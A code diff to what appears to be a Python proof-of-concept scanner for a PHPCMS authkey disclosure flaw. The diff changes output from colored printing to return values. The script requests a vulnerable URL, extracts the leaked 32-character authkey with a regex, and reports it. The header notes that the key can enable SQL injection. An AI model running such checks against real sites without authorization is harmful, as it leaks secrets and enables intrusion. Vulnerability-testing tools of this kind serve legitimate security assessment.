@@ -9,8 +9,8 @@ description: PHPCMS authkey 泄露漏洞，可引起SQL注入。
 import re
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class phpcms_authkey_disclosure_BaseVerify:
     def __init__(self, url):
@@ -26,12 +26,12 @@ class phpcms_authkey_disclosure_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             m = re.search('(\w{32})',req.text)
             if req.status_code == 200 and m:
-                cprint("[+]存在PHPCMS authkey泄露漏洞...(高危)\tpayload: "+vulnurl+"\tauthkey: "+m.group(1), "red")
+                return "[+]存在PHPCMS authkey泄露漏洞...(高危)\tpayload: "+vulnurl+"\tauthkey: "+m.group(1)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = phpcms_authkey_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
